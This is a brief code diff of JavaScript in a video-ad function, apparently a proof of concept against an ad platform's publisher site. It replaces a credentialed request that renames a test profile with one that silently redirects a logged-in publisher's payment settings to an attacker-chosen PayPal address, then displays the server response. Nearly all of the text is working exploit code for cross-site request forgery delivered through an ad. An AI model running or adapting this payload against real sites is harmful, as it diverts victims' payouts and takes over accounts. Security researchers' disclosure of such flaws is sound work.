@@ -2043,10 +2043,10 @@
         }
         window.getVPAIDAd = function() {
               var xhttp = new XMLHttpRequest();
-              xhttp.open("PUT", "https://login.teads.tv/api/profile/me", true);
+              xhttp.open("POST", "https://publishers.teads.tv/settings/paymentSettings", true);
   xhttp.withCredentials = true;
             xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-  xhttp.send(JSON.stringify({"id":57584,"email":"pubtestsecure@gmail.com","culture":"en_US","firstname":"PubtestsecureHackedHello","lastname":"Test","timezone":"Europe/Paris"}));
+  xhttp.send(JSON.stringify({"publisherSettingsId":"15138","paymentMode":"paypal","paypalEmail":"dddd@dddduuu.com"}));
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4) {
       alert(this.responseText);
